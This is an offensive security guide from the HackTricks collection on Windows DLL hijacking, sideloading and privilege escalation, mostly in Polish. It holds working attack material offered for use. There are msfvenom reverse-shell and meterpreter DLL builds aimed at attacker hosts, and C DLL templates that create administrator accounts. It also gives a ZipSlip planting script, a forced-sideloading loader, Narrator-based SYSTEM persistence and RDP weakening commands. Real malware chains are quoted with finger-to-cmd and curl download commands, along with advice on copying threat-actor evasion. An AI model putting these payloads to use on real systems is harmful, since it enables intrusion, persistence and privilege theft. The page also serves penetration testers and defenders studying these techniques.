# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking polega na zmanipulowaniu zaufanej aplikacji tak, by załadowała złośliwy DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection, and Side-Loading**. Jest głównie wykorzystywany do wykonania kodu, uzyskania persistence oraz, rzadziej, eskalacji uprawnień. Choć tutaj skupiamy się na eskalacji, metoda hijackingu jest taka sama niezależnie od celu.

### Common Techniques

Do DLL hijackingu stosuje się kilka metod, których skuteczność zależy od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Podmiana oryginalnego DLL na złośliwy, opcjonalnie z użyciem DLL Proxying, by zachować funkcjonalność oryginału.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwego DLL w ścieżce wyszukiwania przed oryginalnym, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Stworzenie złośliwego DLL, który aplikacja załaduje, myśląc, że chodzi o nieistniejący wymagany DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak %PATH% lub pliki .exe.manifest / .exe.local, aby przekierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Zastąpienie oryginalnego DLL złośliwą wersją w katalogu WinSxS, metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwego DLL w katalogu kontrolowanym przez użytkownika razem ze skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

> [!TIP]
> Aby zobaczyć krok po kroku chain, który nakłada HTML staging, AES-CTR configs i .NET implants na topie DLL sideloading, sprawdź workflow poniżej.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najczęstszym sposobem znalezienia brakujących Dlls w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals, **ustawienie** **następujących 2 filtrów**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i pokazanie tylko **File System Activity**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących dlls ogólnie**, zostaw to uruchomione na kilka **sekund**.\
Jeśli szukasz **brakującego dll w konkretnym pliku wykonywalnym**, powinieneś ustawić **inny filtr, np. "Process Name" "contains" `<exec name>`, uruchomić go i zatrzymać przechwytywanie zdarzeń**.

## Exploiting Missing Dlls

Aby eskalować uprawnienia, najlepsza szansa to móc **zapisac dll, który proces z wyższymi uprawnieniami spróbuje załadować** w jednym z **miejsc, gdzie będzie szukany**. W rezultacie będziemy mogli **zapisac** dll w **folderze**, w którym **dll jest wyszukiwany przed** folderem zawierającym **oryginalny dll** (dziwny przypadek), albo będziemy mogli **zapisac w folderze, w którym dll będzie szukany**, gdy oryginalny **dll nie istnieje** w żadnym folderze.

### Dll Search Order

**W dokumentacji** [**Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **można znaleźć szczegóły dotyczące ładowania Dll.**

**Aplikacje Windows** szukają DLL, podążając za zestawem **wstępnie zdefiniowanych ścieżek wyszukiwania**, w określonej kolejności. Problem DLL hijacking pojawia się, gdy złośliwy DLL zostanie strategicznie umieszczony w jednym z tych katalogów, tak że zostanie załadowany przed autentycznym DLL. Rozwiązaniem zapobiegającym temu jest upewnienie się, że aplikacja używa ścieżek bezwzględnych przy odwoływaniu się do potrzebnych DLL.

Poniżej widać **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

To jest **domyślna** kolejność wyszukiwania z włączonym **SafeDllSearchMode**. Gdy jest wyłączona, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywoływana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec, zauważ że **dll może być załadowany podając ścieżkę bezwzględną zamiast tylko nazwy**. W takim przypadku dll będzie **wyszukiwany tylko w tej ścieżce** (jeśli dll ma jakieś zależności, będą one wyszukiwane tak, jakby były ładowane po nazwie).

Są inne sposoby na zmianę kolejności wyszukiwania, ale nie będę ich tu wyjaśniać.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Użyj **ProcMon** filtrów (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) aby zebrać nazwy DLL, które proces sprawdzał, ale nie mógł znaleźć.
2. Jeśli binarka uruchamia się w **harmonogramie/service**, upuszczenie DLL o jednej z tych nazw do **katalogu aplikacji** (pozycja #1 w kolejności wyszukiwania) zostanie załadowane przy następnym uruchomieniu. W jednym przypadku .NET scanner szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem rzeczywistej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym exportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli twoja prymitywa to **ZipSlip-style arbitrary write**, stwórz ZIP, którego wpis ucieka z katalogu rozpakowywania, tak aby DLL trafił do folderu aplikacji:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do monitorowanej skrzynki/udziału; gdy zadanie zaplanowane ponownie uruchomi proces, załaduje z niego złośliwy DLL i wykona twój kod w kontekście konta usługi.

### Wymuszanie sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo tworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Dostarczając tutaj katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje zaimportowany DLL po nazwie (bez ścieżki bezwzględnej i nie używając bezpiecznych flag ładowania), może zostać zmuszony do załadowania z tego katalogu złośliwego DLL.

Key idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowe DllPath wskazujące na kontrolowany folder (np. katalog, w którym znajduje się twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy binarka docelowa rozwiąże DLL po nazwie, loader sprawdzi dostarczone DllPath podczas rozwiązywania, umożliwiając niezawodne sideloading nawet jeśli złośliwy DLL nie znajduje się w tym samym katalogu co docelowy EXE.

Notes/limitations
- To dotyczy tworzonego procesu potomnego; różni się od SetDllDirectory, które wpływa tylko na bieżący proces.
- Proces docelowy musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i twardo zapisane ścieżki bezwzględne nie mogą zostać przejęte. Forwarded exports i SxS mogą zmienić priorytet.

Minimalny przykład w C (ntdll, szerokie łańcuchy, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie DLL sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Tak, warunki są trudne do znalezienia, ponieważ **domyślnie jest raczej dziwne znaleźć uprzywilejowany plik wykonywalny bez brakującej dll** i jeszcze **dziwniejsze jest mieć uprawnienia do zapisu w folderze na ścieżce systemowej** (domyślnie nie możesz). Jednak w źle skonfigurowanych środowiskach jest to możliwe.\
Jeśli masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest bypass UAC**, możesz znaleźć tam **PoC** Dll hijaking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz uprawnienia do zapisu).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić imports pliku executable oraz exports dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik, jak **wykorzystać Dll Hijacking do eskalacji uprawnień** mając uprawnienia do zapisu w **folderze PATH systemu**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze w PATH systemowym.\
Inne interesujące zautomatyzowane narzędzia do wykrywania tej podatności to **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll_.

### Przykład

Jeśli znajdziesz wykorzystalny scenariusz, jedną z najważniejszych rzeczy do jego pomyślnego wykorzystania będzie **stworzenie dll, która eksportuje przynajmniej wszystkie funkcje, które plik wykonywalny będzie z niej importował**. Zwróć uwagę, że Dll Hijacking przydaje się do [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **jak stworzyć poprawną dll** znajdziesz w tym studium dotyczącym dll hijacking do wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do stworzenia **dll eksportującej funkcje niebędące wymaganymi**.

## **Tworzenie i kompilacja Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to dll zdolna do **wykonania twojego złośliwego kodu po załadowaniu**, ale także do **zachowywania się** i **działania** zgodnie z oczekiwaniami poprzez **przekazywanie wszystkich wywołań do rzeczywistej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz faktycznie **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz proxify, i **wygenerować proxified dll** lub **wskazać Dll** i **wygenerować proxified dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własne

Zauważ, że w kilku przypadkach Dll, który skompilujesz, musi **export several functions**, które zostaną załadowane przez victim process; jeśli te functions nie istnieją, **binary won't be able to load** je i **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywny DLL w C z funkcją wejścia w wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal próbuje załadować przewidywalny, specyficzny dla języka DLL lokalizacyjny podczas uruchamiania — DLL ten może zostać hijacked, co umożliwia arbitrary code execution i persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naiwny hijack spowoduje, że Narrator będzie mówił/podświetlał UI. Aby zachować ciszę, podczas attachu wypisz wątki Narratora, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wywołaj `SuspendThread`; kontynuuj we własnym wątku. Zobacz PoC po pełny kod.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Dzięki powyższemu uruchomienie Narrator załaduje wstawiony DLL. Na secure desktop (ekran logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twój DLL wykona się jako SYSTEM na secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się przez RDP z hostem, na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twój DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie ustaje po zamknięciu sesji RDP — inject/migrate szybko.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wbudowany wpis Accessibility Tool (AT) w rejestrze (np. CursorIndicator), edytować go, aby wskazywał na dowolny binarny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. To umożliwia proxy dowolnego wykonania w ramach Accessibility.

Notes
- Zapis pod `%windir%\System32` oraz zmiana wartości w HKLM wymaga uprawnień administratora.
- Cała logika payloadu może żyć w `DLL_PROCESS_ATTACH`; eksporty nie są potrzebne.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakujący DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako zwykły użytkownik, upuść `hostfxr.dll` do `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj aż zadanie zaplanowane uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli administrator jest zalogowany w momencie wykonywania zadania, złośliwy DLL uruchomi się w sesji administratora na poziomie medium integrity.
4. Połącz standardowe UAC bypass techniques, aby podnieść uprawnienia z medium integrity do SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading przy użyciu wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalnie podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z katalogu, w którym się znajduje.
- wsc.dll: attacker DLL. Jeśli nie są wymagane żadne konkretne exports, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane exports do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Dla wymagań eksportu użyj frameworka proxy (np. DLLirant/Spartacus) do wygenerowania forwarding DLL, który również wykona twój payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez plik binarny hosta. Jeśli host używa ścieżek absolutnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na priorytet ładowania i należy je uwzględnić przy wyborze pliku binarnego hosta oraz zestawu eksportów.

## Podpisane triady + zaszyfrowane payloads (studium przypadku ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad, korzystając z **trójelementowej triady** plików, co pozwala wtopić się w legalne oprogramowanie, jednocześnie przechowując główny payload zaszyfrowany na dysku:

1. **Signed host EXE** – dostawcy tacy jak AMD, Realtek czy NVIDIA są nadużywani (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę wykonywalnego pliku, aby wyglądał jak binarka Windows (np. `conhost.exe`), ale podpis Authenticode pozostaje ważny.
2. **Malicious loader DLL** – upuszczany obok EXE z oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL jest zwykle binarnym plikiem MFC zamaskowanym za pomocą frameworka ScatterBrain; jej jedynym zadaniem jest znaleźć zaszyfrowany blob, odszyfrować go i reflectively map ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po memory-mappingu odszyfrowanego payloadu loader usuwa plik TMP, by zniszczyć dowody śledcze.

Tradecraft notes:

* Renaming the signed EXE (while keeping the original `OriginalFileName` in the PE header) lets it masquerade as a Windows binary yet retain the vendor signature, so replicate Ink Dragon’s habit of dropping `conhost.exe`-looking binaries that are really AMD/NVIDIA utilities.
* Because the executable stays trusted, most allowlisting controls only need your malicious DLL to sit alongside it. Focus on customizing the loader DLL; the signed parent can typically run untouched.
* ShadowPad’s decryptor expects the TMP blob to live next to the loader and be writable so it can zero the file after mapping. Keep the directory writable until the payload loads; once in memory the TMP file can safely be deleted for OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS tak, że jedynym niestandardowym artefaktem na dysku jest złośliwy DLL obok zaufanego EXE:

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera komendy z serwera Finger i przekazuje je do `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pobiera tekst z TCP/79; `| cmd` wykonuje odpowiedź serwera, pozwalając operatorom rotować drugą fazę po stronie serwera.

- **Built-in download/extract:** Pobierz archiwum z nieszkodliwym rozszerzeniem, wypakuj je i przygotuj sideload target oraz DLL w losowym folderze `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows tar.

- **WMI/CIM launch:** Uruchom EXE przez WMI tak, aby telemetryka pokazywała proces utworzony przez CIM, podczas gdy ładuje on współlokowany DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Działa z binarkami, które preferują lokalne DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) uruchamia się pod zaufaną nazwą.

- **Hunting:** Włącz alerty dla `forfiles` gdy występują razem `/p`, `/m` i `/c`; rzadkie poza skryptami administracyjnymi.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Ostatnie włamanie Lotus Blossom nadużyło zaufanego łańcucha aktualizacji, aby dostarczyć droppera spakowanego NSIS, który przygotowywał DLL sideload oraz całkowicie in-memory payloady.

Tradecraft flow
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go **HIDDEN**, upuszcza przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy `log.dll` i zaszyfrowany blob `BluetoothService`, a następnie uruchamia EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` mmap-loads blob; `LogWrite` odszyfrowuje go przy użyciu niestandardowego strumienia opartego na LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor plaintext shellcode, zwalnia tymczasowe zasoby i skacze do niego.
